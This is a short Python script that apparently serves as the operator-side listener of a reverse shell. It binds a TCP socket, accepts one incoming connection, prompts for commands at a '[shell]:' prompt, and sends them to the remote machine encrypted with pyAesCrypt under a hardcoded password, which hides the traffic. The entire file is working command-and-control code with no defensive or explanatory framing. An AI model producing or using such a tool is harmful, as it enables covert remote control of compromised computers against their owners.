import socket,os
import pyAesCrypt
import io

# Socket configuration (AF_INET=ipv4, SOCK_STREAM=TCP)
c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# metodo
c.bind(('0.0.0.0', xxxx))
c.listen(1)
s,a = c.accept()

bufferSize = 1024000
password = 'tonona'

def encryptData(msg):
    pbdata = str.encode(msg)
    fIn = io.BytesIO(pbdata)
    fCiph = io.BytesIO()
    pyAesCrypt.encryptStream(fIn, fCiph, password, bufferSize)
    dataToSend = fCiph.getvalue()
    return dataToSend

def decryptData(msg):
    fullData = b''
    fCiph = io.BytesIO()
    fDec = io.BytesIO()
    fCiph = io.BytesIO(msg)
    ctlen = len(fCiph.getvalue())
    fCiph.seek(0)
    pyAesCrypt.decryptStream(fCiph, fDec, password, bufferSize, ctlen)
    decrypted = str(fDec.getvalue().decode("utf-8", "replace"))
    return decrypted


while True:
    data =s.recv(1024000)
    if decryptData(data).endswith("EOFX") == True:
        nextcmd = input("[shell]: ")
        if nextcmd == 'quit':
            print('\nQuitting...')
            s.send(encryptData(nextcmd))  
            break      
        else: s.send(encryptData(nextcmd))
    else:
        print('\n' + decryptData(data))

